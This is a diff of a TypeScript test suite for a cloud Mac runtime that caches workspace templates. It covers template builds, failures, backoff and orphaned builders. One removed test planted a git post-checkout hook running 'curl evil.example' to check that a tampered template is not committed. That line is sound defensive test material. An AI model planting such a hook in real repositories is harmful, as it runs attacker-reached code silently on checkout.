@@ -14,7 +14,7 @@ import {
   type Cleanups,
   type World,
 } from "./guestTestFixture.ts";
-import { makeNamespaceMacRuntime } from "./NamespaceMacRuntime.ts";
+import { failedBuild, makeNamespaceMacRuntime, nextBuild } from "./NamespaceMacRuntime.ts";
 import type { ChatRecord } from "./namespaceChat.ts";
 import { makeChatStore } from "./namespaceChatStore.ts";
 import {
@@ -25,7 +25,12 @@ import {
 } from "./namespaceInstances.ts";
 import { NamespaceProxyManager } from "./namespaceProxy.ts";
 import { ProvisionedSandboxMissing } from "./driver.ts";
-import { ProvisionPreparationManifest } from "./ProvisionPreparation.ts";
+import {
+  frozenMacTemplate,
+  provisionDigest,
+  ProvisionPreparationManifest,
+  type MacTemplateIdentity,
+} from "./ProvisionPreparation.ts";
 
 const cleanups: Cleanups = [];
 afterEach(async () => {
@@ -45,8 +50,16 @@ const MINUTE = 60_000;
 function fakeNamespace(w: World, lifetimeMs = 5 * 60 * MINUTE) {
   const macs = new Map<
     InstanceId,
-    { readonly labels: Readonly<Record<string, string>>; alive: boolean; deadline: number }
+    {
+      readonly labels: Readonly<Record<string, string>>;
+      alive: boolean;
+      deadline: number;
+      /** Another manager's Mac, outside this world's one volume. */
+      readonly elsewhere?: boolean;
+    }
   >();
+  /** Makes the next create with these labels fail after Namespace made the instance. */
+  let failCreate: ((labels: Readonly<Record<string, string>>) => boolean) | null = null;
   const departures: Array<{ instanceId: InstanceId; departure: Departure }> = [];
   /** Runs once inside the next `list`, as another operation would between its read and write. */
   let duringList: (() => Promise<void>) | null = null;
@@ -65,7 +78,7 @@ function fakeNamespace(w: World, lifetimeMs = 5 * 60 * MINUTE) {
       .map(([instanceId]) => incarnation(instanceId));
   const instances: NamespaceInstances = {
     create: async (spec) => {
-      if ([...macs.values()].some((mac) => mac.alive))
+      if ([...macs.values()].some((mac) => mac.alive && !mac.elsewhere))
         throw new Error("this world holds one Mac at a time");
       await w.newMac();
       const instanceId = InstanceId.make(w.instance());
@@ -74,6 +87,10 @@ function fakeNamespace(w: World, lifetimeMs = 5 * 60 * MINUTE) {
         alive: true,
         deadline: Math.min(spec.deadline, Date.now() + lifetimeMs),
       });
+      if (failCreate?.(spec.labels)) {
+        failCreate = null;
+        throw new Error("Namespace timed out waiting for the instance");
+      }
       return incarnation(instanceId);
     },
     describe: async (instanceId) => (macs.get(instanceId)?.alive ? incarnation(instanceId) : null),
@@ -102,7 +119,7 @@ function fakeNamespace(w: World, lifetimeMs = 5 * 60 * MINUTE) {
       if (!mac?.alive) return;
       departures.push({ instanceId, departure });
       mac.alive = false;
-      await w.depart(departure);
+      if (!mac.elsewhere) await w.depart(departure);
     },
     expose: async (_instanceId, port) => `http://127.0.0.1:${port}`,
     upload: async (_instanceId, localPath, guestPath) => NodeFSP.copyFile(localPath, guestPath),
@@ -113,7 +130,20 @@ function fakeNamespace(w: World, lifetimeMs = 5 * 60 * MINUTE) {
     interleave: (run: () => Promise<void>) => {
       duringList = run;
     },
+    /** A Mac some other manager runs, or this one ran before it restarted. */
+    elsewhere: (instanceId: string, labels: Readonly<Record<string, string>>) =>
+      void macs.set(InstanceId.make(instanceId), {
+        labels,
+        alive: true,
+        deadline: Date.now() + lifetimeMs,
+        elsewhere: true,
+      }),
+    failNextCreate: (when: (labels: Readonly<Record<string, string>>) => boolean) => {
+      failCreate = when;
+    },
     live: () => live({}).map(({ instanceId }) => instanceId),
+    departed: (instanceId: string) =>
+      departures.find((departure) => departure.instanceId === instanceId)?.departure ?? null,
     kill: async (instanceId: InstanceId) => {
       const mac = macs.get(instanceId);
       if (mac) mac.alive = false;
@@ -178,13 +208,31 @@ const unreachable = async (): Promise<never> => {
   throw new Error("this test configures no Namespace artifacts");
 };
 
-async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<string>) {
+/** Starts a service for the chat; a builder must not run it. Ignored by git, so `clean` keeps it. */
+const BACKGROUND = "echo ran > background.bin";
+
+async function setup(
+  options: {
+    readonly lifetimeMs?: number;
+    readonly derivedHomePaths?: ReadonlyArray<string>;
+    /** Prepare commands a builder runs instead of the chat's, as a `background` marker freezes. */
+    readonly buildPrepareCommands?: (chatCommands: ReadonlyArray<string>) => ReadonlyArray<string>;
+    /** The template current config names, by how many times it was asked; the chat's by default. */
+    readonly current?: (frozen: MacTemplateIdentity, asked: number) => MacTemplateIdentity | null;
+    /** Runs before the runtime starts, as Namespace stood when the manager came up. */
+    readonly before?: (namespace: ReturnType<typeof fakeNamespace>, stateDir: string) => void;
+  } = {},
+) {
+  const { lifetimeMs, derivedHomePaths } = options;
   const w = await makeWorld(cleanups);
   const namespace = fakeNamespace(w, lifetimeMs);
+  const logged: Array<{ readonly message: string; readonly fields: Record<string, unknown> }> = [];
+  let asked = 0;
   const storage = await fakeArtifacts();
   const proxies = new NamespaceProxyManager();
   cleanups.push(() => proxies.close({ proxyId: `provision-${chatId}` }));
   const stateDir = NodePath.join(w.base, "manager");
+  options.before?.(namespace, stateDir);
   const runtime = makeNamespaceMacRuntime({
     session: {
       artifacts: {
@@ -201,8 +249,17 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
     instances: namespace.instances,
     artifacts: storage.artifacts,
     toolInstall: "true",
+    // The world holds one Mac at a time, so builds run when a test frees it.
+    startBuild: (build) => void builds.push(build),
+    currentTemplate: async () => {
+      const frozen = frozenMacTemplate(manifest, null);
+      return options.current ? options.current(frozen, ++asked) : frozen;
+    },
+    log: (message, fields) => void logged.push({ message, fields }),
   });
+  const builds: Array<() => Promise<void>> = [];
   const prepared = await w.prepareInput(chatId, w.head());
+  const prepareCommands = [...(prepared.prepareCommands ?? []), BACKGROUND];
   const manifest = decodeManifest({
     input: {
       requestId: chatId,
@@ -235,7 +292,7 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
       port: await freePort(),
       readinessTimeoutSeconds: 10,
       brokerTtl: "1h",
-      prepareCommands: prepared.prepareCommands,
+      prepareCommands,
       files: prepared.files,
     },
     localArtifact: {
@@ -247,6 +304,9 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
     },
     egressAllow: [],
     ...(derivedHomePaths ? { derivedHomePaths } : {}),
+    buildPrepareCommands: (options.buildPrepareCommands ?? ((commands) => commands.slice(0, -1)))(
+      prepareCommands,
+    ),
   });
   const operation = (environmentId: string, retentionDeadline?: string) =>
     decodeOperation({
@@ -275,6 +335,12 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
   return {
     w,
     namespace,
+    /** Template builds the runtime asked for and has not run yet. */
+    builds,
+    logged: (message: string) => logged.filter((entry) => entry.message === message),
+    runBuilds: async () => {
+      for (const build of builds.splice(0)) await build();
+    },
     storage,
     runtime,
     manifest,
@@ -290,10 +356,12 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
 }
 
 describe("Namespace Mac runtime", () => {
-  it("fills the cache on a miss, saves while it works, releases, and resumes elsewhere with its work", async () => {
+  it("asks for one build on a miss, saves while it works, releases, and resumes elsewhere with its work", async () => {
     const t = await setup();
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
-    expect(await t.record()).toMatchObject({ kind: "live", mac: { cache: "sealed" } });
+    expect(await t.record()).toMatchObject({ kind: "live", mac: { cache: "ready" } });
+    expect(t.builds, "a miss asks for a build").toHaveLength(1);
+    expect(await t.read("background.bin"), "a chat runs its background commands").toBe("ran\n");
     const op = t.operation(ready.environmentId);
     const attached = await t.runtime.attach(op, t.manifest);
     expect(attached.pairingUrl).toBe(
@@ -316,10 +384,7 @@ describe("Namespace Mac runtime", () => {
 
     const resumed = await t.runtime.resume(op, t.manifest, attached.namespaceProxy);
     expect(resumed.namespaceProxy).toEqual(attached.namespaceProxy);
-    expect(await t.record(), "a restored chat only reads the cache").toMatchObject({
-      kind: "live",
-      mac: { cache: "reader" },
-    });
+    expect(t.builds, "another miss joins the build in flight").toHaveLength(1);
     expect(await t.read("agent.txt")).toBe("first turn\n");
     expect(await t.runtime.touch(op)).toBe("running");
 
@@ -337,38 +402,147 @@ describe("Namespace Mac runtime", () => {
 
     await t.runtime.dispose(op, t.manifest);
     expect([t.namespace.live(), t.storage.live(), await t.record()]).toEqual([[], [], null]);
-    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["commit", "abandon"]);
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+    ]);
+    expect(t.w.committedVolume(), "a chat's Mac never commits").toBeNull();
   });
 
-  it("commits a filler's volume holding only its sealed template, and abandons one whose template changed", async () => {
+  it("builds a template without the chat's background commands, which the next chat adopts", async () => {
     const t = await setup();
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
-    expect(await t.runtime.release(t.operation(ready.environmentId), t.manifest)).toBe("released");
+    const op = t.operation(ready.environmentId);
+    await t.write("agent.txt", "first turn\n");
+    expect(await t.runtime.release(op, t.manifest)).toBe("released");
+    await t.runBuilds();
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon", "commit"]);
     const committed = t.w.committedVolume();
     if (committed === null) throw new Error("expected a committed volume");
-    expect((await NodeFSP.readdir(committed)).toSorted(), "no chat root reaches the cache").toEqual(
-      ["cache.lock", `t3-runtime-${t.w.runtimeSha256}.tar`, "template", "template.json"],
+    expect((await NodeFSP.readdir(committed)).toSorted(), "no root reaches the cache").toEqual([
+      "cache.lock",
+      `t3-runtime-${t.w.runtimeSha256}.tar`,
+      "template",
+      "template.json",
+    ]);
+    const template = NodePath.join(committed, "template", "workspace.partial");
+    expect(await NodeFSP.readdir(template), "the builder ran no background command").not.toContain(
+      "background.bin",
+    );
+    expect(await NodeFSP.readdir(NodePath.join(template, "node_modules"))).toContain(
+      ".installed-at",
     );
 
-    const tampered = await setup();
-    const opened = await tampered.runtime.prepare(tampered.operation("pending"), tampered.manifest);
-    await NodeFSP.writeFile(
-      NodePath.join(
-        tampered.w.mount,
-        "template",
-        "workspace.partial",
-        ".git",
-        "hooks",
-        "post-checkout",
-      ),
-      "#!/bin/sh\ncurl evil.example\n",
-      { mode: 0o755 },
+    await t.runtime.resume(op, t.manifest);
+    expect(t.builds, "a hit asks for no build").toEqual([]);
+    expect(await t.read("agent.txt")).toBe("first turn\n");
+    expect(await t.read("background.bin")).toBe("ran\n");
+    expect(await t.runtime.release(op, t.manifest)).toBe("released");
+    expect(t.w.committedVolume(), "the chat that adopted it leaves the cache as it was").toBe(
+      committed,
     );
-    expect(
-      await tampered.runtime.release(tampered.operation(opened.environmentId), tampered.manifest),
-    ).toBe("released");
-    expect(tampered.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
-    expect(tampered.w.committedVolume(), "a changed template is never committed").toBeNull();
+  });
+
+  it("leaves a current template alone and never commits a build that failed", async () => {
+    const failing = await setup({ buildPrepareCommands: () => ["exit 3"] });
+    const opened = await failing.runtime.prepare(failing.operation("pending"), failing.manifest);
+    await failing.runtime.release(failing.operation(opened.environmentId), failing.manifest);
+    await failing.runBuilds();
+    expect(failing.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+    ]);
+    expect(failing.w.committedVolume()).toBeNull();
+
+    const t = await setup();
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    await t.runtime.release(t.operation(ready.environmentId), t.manifest);
+    const [build] = t.builds;
+    if (build === undefined) throw new Error("expected a requested build");
+    await build();
+    const committed = t.w.committedVolume();
+    // The same build again, as when a second manager or a later miss lands on a filled site.
+    await build();
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "commit",
+      "abandon",
+    ]);
+    expect(t.w.committedVolume()).toBe(committed);
+  });
+
+  it("builds only for a chat frozen under current config, and never commits a template superseded mid-build", async () => {
+    const outdated = await setup({ current: (frozen) => ({ ...frozen, key: "newer" }) });
+    const ready = await outdated.runtime.prepare(outdated.operation("pending"), outdated.manifest);
+    await outdated.runtime.release(outdated.operation(ready.environmentId), outdated.manifest);
+    await outdated.runBuilds();
+    expect(outdated.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
+    expect(outdated.logged("namespace mac template build skipped")).toMatchObject([
+      { fields: { reason: "superseded" } },
+    ]);
+
+    // Current when the build starts; the pin moves while it prepares.
+    const moved = await setup({
+      current: (frozen, asked) => (asked === 1 ? frozen : { ...frozen, runtimeSha256: "next" }),
+    });
+    const opened = await moved.runtime.prepare(moved.operation("pending"), moved.manifest);
+    await moved.runtime.release(moved.operation(opened.environmentId), moved.manifest);
+    await moved.runBuilds();
+    expect(moved.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+    ]);
+    expect(moved.w.committedVolume()).toBeNull();
+  });
+
+  it("leaves a build to the manager already running one", async () => {
+    const t = await setup();
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    await t.runtime.release(t.operation(ready.environmentId), t.manifest);
+    t.namespace.elsewhere("other-builder", { "t3.builder": cacheTagOf("example/repo") });
+    await t.runBuilds();
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
+    expect(t.logged("namespace mac template build skipped")).toMatchObject([
+      { fields: { reason: "running" } },
+    ]);
+  });
+
+  it("abandons the builders a restarted manager left, and a builder whose create failed late", async () => {
+    const t = await setup({
+      before: (namespace, stateDir) =>
+        namespace.elsewhere("orphan", {
+          "t3.builder": cacheTagOf("example/repo"),
+          "t3.manager": provisionDigest(stateDir).slice(0, 12),
+        }),
+    });
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    await t.runtime.release(t.operation(ready.environmentId), t.manifest);
+    t.namespace.failNextCreate((labels) => labels["t3.builder"] !== undefined);
+    await t.runBuilds();
+    expect(t.namespace.departed("orphan")).toBe("abandon");
+    expect(t.namespace.live(), "the half-created builder is gone too").toEqual([]);
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+      "abandon",
+    ]);
+    expect(t.logged("namespace mac template build failed")).toHaveLength(1);
+  });
+
+  it("backs off after a failed build and warns about the build it held back", async () => {
+    const t = await setup({ buildPrepareCommands: () => ["exit 3"] });
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    const op = t.operation(ready.environmentId);
+    await t.runtime.release(op, t.manifest);
+    await t.runBuilds();
+    expect(t.logged("namespace mac template build failed")).toHaveLength(1);
+    await t.runtime.resume(op, t.manifest);
+    await t.runtime.release(op, t.manifest);
+    await t.runBuilds();
+    expect(t.logged("namespace mac template build suppressed")).toMatchObject([
+      { fields: { reason: "backoff" } },
+    ]);
+    expect(t.namespace.departures, "the held-back build made no Mac").toHaveLength(3);
   });
 
   it("keeps a snapshot only as long as its lease's retention, and resumes an expired one as missing", async () => {
@@ -391,7 +565,7 @@ describe("Namespace Mac runtime", () => {
   });
 
   it("leaves a repository's derived home paths out of its snapshots", async () => {
-    const t = await setup(undefined, [".claude"]);
+    const t = await setup({ derivedHomePaths: [".claude"] });
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
     expect(await t.runtime.release(t.operation(ready.environmentId), t.manifest)).toBe("released");
     const bytes = t.storage.bytesOf((await t.record())?.snapshot?.artifactPath ?? "");
@@ -432,7 +606,7 @@ describe("Namespace Mac runtime", () => {
       snapshot: released.snapshot,
       mac: {
         incarnation: { ...before.mac.incarnation, instanceId: InstanceId.make("mac-new") },
-        cache: "reader",
+        cache: "ready",
       },
     };
     await t.overwrite({ ...before, snapshot: released.snapshot });
@@ -457,7 +631,7 @@ describe("Namespace Mac runtime", () => {
   });
 
   it("releases a Mac near its deadline once its chat is idle, and refuses a missing snapshot", async () => {
-    const t = await setup(20 * MINUTE);
+    const t = await setup({ lifetimeMs: 20 * MINUTE });
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
     const op = t.operation(ready.environmentId);
     await t.write("agent.txt", "work\n");
@@ -465,6 +639,27 @@ describe("Namespace Mac runtime", () => {
     expect(await t.runtime.upkeep(op, t.manifest, async () => false)).toBe("released");
     expect(t.namespace.live()).toEqual([]);
     expect(await t.runtime.touch(op)).toBe("released");
-    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["commit"]);
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
+  });
+});
+
+/** The cache tag the runtime derives for a repository. */
+const cacheTagOf = (repository: string) => `t3-mac-${provisionDigest(repository).slice(0, 12)}-v1`;
+
+describe("template build bounds", () => {
+  const HOUR = 60 * MINUTE;
+  const fresh = { started: [], failures: 0, retryAt: 0 };
+  it("caps a repository at three builds an hour", () => {
+    expect(nextBuild({ ...fresh, started: [0, 1, 2] }, 3)).toBe("cap");
+    expect(nextBuild({ ...fresh, started: [0, 1, 2] }, HOUR)).toBe("due");
+  });
+  it("doubles the wait after each failure, up to two hours", () => {
+    const once = failedBuild(fresh, 0);
+    const twice = failedBuild(once, once.retryAt);
+    expect([once.retryAt, twice.retryAt - once.retryAt]).toEqual([5 * MINUTE, 10 * MINUTE]);
+    expect(nextBuild(once, once.retryAt - 1)).toBe("backoff");
+    let history: ReturnType<typeof failedBuild> = fresh;
+    for (let i = 0; i < 10; i++) history = failedBuild(history, 0);
+    expect(history.retryAt).toBe(2 * HOUR);
   });
 });
